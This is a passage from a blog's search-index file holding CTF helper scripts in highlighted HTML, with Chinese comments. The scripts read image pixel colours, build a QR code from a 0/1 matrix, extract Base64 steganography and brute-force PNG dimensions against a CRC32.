class="comment">//crypt</span></span><br><span class="line">    <span class="comment">//out</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; pData[i]; i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>,pData[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;字符串格式为：\n%s&quot;</span>,pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="获取图片rbg"><a href="#获取图片rbg" class="headerlink" title="获取图片rbg"></a>获取图片rbg</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment"># open file</span></span><br><span class="line">filename = </span><br><span class="line">image = Image.<span class="built_in">open</span>(filename)</span><br><span class="line"><span class="comment"># select format</span></span><br><span class="line">image = image.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line"><span class="comment"># Select coordinates</span></span><br><span class="line">x = </span><br><span class="line">y = </span><br><span class="line">rgb = image.getpixel((x, y))</span><br><span class="line"><span class="built_in">print</span>(rgb)</span><br></pre></td></tr></table></figure><h3 id="01矩阵生成二维码"><a href="#01矩阵生成二维码" class="headerlink" title="01矩阵生成二维码"></a>01矩阵生成二维码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取33*33的01矩阵</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;matrix.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    matrix = [[<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> line.strip().split()] <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据01矩阵生成二维码图片</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">33</span>, <span class="number">33</span>), color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">pixels = img.load()</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">if</span> matrix[y][x] == <span class="number">1</span>:</span><br><span class="line">            pixels[x, y] = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)  <span class="comment"># 黑色像素</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存二维码图片</span></span><br><span class="line">img.save(<span class="string">&#x27;qrcode.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Base64隐写"><a href="#Base64隐写" class="headerlink" title="Base64隐写"></a>Base64隐写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base64_stego</span>(<span class="params">lines</span>):</span><br><span class="line">    alphabet = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    temp = <span class="number">0</span></span><br><span class="line">    bit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> i[-<span class="number">1</span>] != <span class="string">&#x27;=&#x27;</span>:<span class="comment"># 无等号</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> i[-<span class="number">2</span>] != <span class="string">&#x27;=&#x27;</span>:<span class="comment"># 单等号，取出倒数第二个字符的后两位</span></span><br><span class="line">            bit += <span class="number">2</span></span><br><span class="line">            temp = (temp &lt;&lt; <span class="number">2</span>) + (alphabet.find(i[-<span class="number">2</span>]) &amp; <span class="number">0x3</span>)</span><br><span class="line">        <span class="keyword">else</span>:<span class="comment"># 双等号，取出倒数第三个字符的后四位</span></span><br><span class="line">            bit += <span class="number">4</span></span><br><span class="line">            temp = (temp &lt;&lt; <span class="number">4</span>) + (alphabet.find(i[-<span class="number">3</span>]) &amp; <span class="number">0xf</span>)</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="number">8</span>:<span class="comment"># 所取bit够一个字节，转为chr</span></span><br><span class="line">            bit = <span class="number">0</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(temp)</span><br><span class="line">            temp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> bit &gt; <span class="number">8</span>:<span class="comment"># 4+2+4，取8位，保存多余两位</span></span><br><span class="line">            bit = <span class="number">2</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(temp &gt;&gt; <span class="number">2</span>)</span><br><span class="line">            temp = temp &amp; <span class="number">0x3</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure><h3 id="CRC32图片宽高爆破"><a href="#CRC32图片宽高爆破" class="headerlink" title="CRC32图片宽高爆破"></a>CRC32图片宽高爆破</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexStr2bytes</span>(<span class="params">s</span>):</span><br><span class="line">    b = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">2</span>):</span><br><span class="line">        temp = s[i:i+<span class="number">2</span>]</span><br><span class="line">        b +=struct.pack(<span class="string">&quot;B&quot;</span>,<span class="built_in">int</span>(temp,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">str1=<span class="string">&quot;49484452&quot;</span><span class="comment"># IHDR</span></span><br><span class="line">str2=<span class="string">&quot;0806000000&quot;</span></span><br><span class="line">bytes1=hexStr2bytes(str1)</span><br><span class="line">bytes2=hexStr2bytes(str2)</span><br><span class="line">wid,hei = <span class="number">1918</span>,<span class="number">864</span><span class="comment"># W &amp; h</span></span><br><span class="line"></span><br><span class="line">crc32 = <span class="string">&quot;0x7dc73f7f&quot;</span><span class="comment"># CRC32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(wid,wid+<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(hei,hei+<span class="number">2000</span>):</span><br><span class="line">        width = <span class="built_in">hex</span>(w)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        height = <span class="built_in">hex</span>(h)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        bytes_temp=hexStr2bytes(width+height)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">hex</span>(zlib.crc32(bytes1+bytes_temp+bytes2))) == <span class="built_in">eval</span>(crc32):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(w),<span class="built_in">hex</span>(h))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Script </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
